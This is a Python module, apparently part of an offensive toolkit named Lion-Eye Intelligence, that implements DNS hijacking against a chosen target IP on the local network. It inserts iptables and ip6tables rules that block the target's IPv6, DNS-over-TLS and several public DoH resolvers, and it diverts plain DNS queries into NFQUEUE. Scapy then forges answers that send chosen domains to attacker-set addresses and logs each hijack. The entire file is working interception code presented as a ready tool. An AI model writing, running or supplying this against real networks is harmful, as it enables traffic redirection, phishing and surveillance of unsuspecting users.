"""
Lion-Eye Intelligence - Lion-Injector (Nuclear DNS Hijacker)
Blocks IPv6 and logs hits to the dashboard.
"""
import os
import sys
import socket
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send
from netfilterqueue import NetfilterQueue
import threading
from utils.helpers import print_info, print_success, print_error
from colorama import Fore, Style

class LionRedirector:
    """
    Handles DNS hijacking and protocol enforcement (Nuclear Mode).
    Forces targets to use standard IPv4 DNS by blocking DoH and IPv6.
    """
    def __init__(self, interface, target_ip, mapping_str=None, profiler=None):
        self.interface = interface
        self.target_ip = target_ip
        self.profiler = profiler
        self.mappings = {}
        self.my_ip = self._get_my_ip()
        self.nfqueue = NetfilterQueue()
        self._stop_event = threading.Event()
        self.doh_ips = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9']
        
        if mapping_str:
            for pair in mapping_str.split(','):
                if ':' in pair:
                    domain, dest = pair.split(':')
                    domain = domain.strip().lower()
                    try:
                        self.mappings[domain] = socket.gethostbyname(dest.strip())
                    except:
                        self.mappings[domain] = dest.strip()

    def _get_my_ip(self):
        """Helper to get the attacker's local IP address."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        except: ip = "127.0.0.1"
        finally: s.close()
        return ip

    def _modify_packet(self, packet):
        """Processes and spoofs DNS packets intercepted by NFQUEUE."""
        scapy_pkt = IP(packet.get_payload())
        
        if scapy_pkt.haslayer(DNS) and scapy_pkt.haslayer(DNSQR) and scapy_pkt[IP].src == self.target_ip:
            qname = scapy_pkt[DNSQR].qname.decode().strip('.').lower()
            
            dest_ip = None
            for domain, tip in self.mappings.items():
                if domain in qname:
                    dest_ip = tip
                    break
            
            if dest_ip:
                qtype = scapy_pkt[DNSQR].qtype
                
                # Force IPv4 by killing IPv6 AAAA queries
                if qtype == 28:
                    res = IP(dst=scapy_pkt[IP].src, src=scapy_pkt[IP].dst)/\
                          UDP(dport=scapy_pkt[UDP].sport, sport=scapy_pkt[UDP].dport)/\
                          DNS(id=scapy_pkt[DNS].id, qr=1, aa=1, rcode=0, qd=scapy_pkt[DNS].qd, ancount=0)
                else:
                    # Craft spoofed IPv4 answer
                    res = IP(dst=scapy_pkt[IP].src, src=scapy_pkt[IP].dst)/\
                          UDP(dport=scapy_pkt[UDP].sport, sport=scapy_pkt[UDP].dport)/\
                          DNS(id=scapy_pkt[DNS].id, qr=1, aa=1, qd=scapy_pkt[DNS].qd,
                               an=DNSRR(rrname=scapy_pkt[DNSQR].qname, type='A', ttl=10, rdata=dest_ip))
                
                send(res, verbose=0, iface=self.interface)
                
                if qtype == 1 and self.profiler:
                    self.profiler.add_hijack_log(qname, dest_ip)
                
                packet.drop()
                return
            
        packet.accept()

    def start(self):
        """Enables the DNS trap and configures firewall rules."""
        if not self.mappings: return
        
        print_info(f"Lion-Redirector: Activating Nuclear Mode for {self.target_ip}...")
        
        # 1. Block IPv6
        os.system(f"ip6tables -I FORWARD -s {self.target_ip} -j DROP >/dev/null 2>&1")
        os.system(f"ip6tables -I FORWARD -d {self.target_ip} -j DROP >/dev/null 2>&1")
        
        # 2. Block Port 853 (Secure DNS) and DoH
        os.system(f"iptables -I FORWARD -p tcp --dport 853 -s {self.target_ip} -j REJECT >/dev/null 2>&1")
        for ip in self.doh_ips:
            os.system(f"iptables -I FORWARD -p tcp --dport 443 -d {ip} -s {self.target_ip} -j REJECT >/dev/null 2>&1")
        
        # 3. Hijack standard DNS
        os.system(f"iptables -I FORWARD -p udp --dport 53 -s {self.target_ip} -j NFQUEUE --queue-num 1 >/dev/null 2>&1")
        
        self.nfqueue.bind(1, self._modify_packet)
        threading.Thread(target=self.nfqueue.run, daemon=True).start()
        print_success("Lion-Redirector is LIVE. Target is forced to use hijacked IPv4 DNS.")

    def stop(self):
        """Performs surgical cleanup of firewall rules."""
        print_info("Nuclear Cleanup...")
        # Restore IPv6
        os.system(f"ip6tables -D FORWARD -s {self.target_ip} -j DROP >/dev/null 2>&1")
        os.system(f"ip6tables -D FORWARD -d {self.target_ip} -j DROP >/dev/null 2>&1")
        
        # Unblock Port 853 and DoH
        os.system(f"iptables -D FORWARD -p tcp --dport 853 -s {self.target_ip} -j REJECT >/dev/null 2>&1")
        for ip in self.doh_ips:
            os.system(f"iptables -D FORWARD -p tcp --dport 443 -d {ip} -s {self.target_ip} -j REJECT >/dev/null 2>&1")
        
        # Remove NFQUEUE
        os.system(f"iptables -D FORWARD -p udp --dport 53 -s {self.target_ip} -j NFQUEUE --queue-num 1 >/dev/null 2>&1")
        
        try: self.nfqueue.unbind()
        except: pass
        print_success("Lion-Redirector disabled.")

LionInjector = LionRedirector
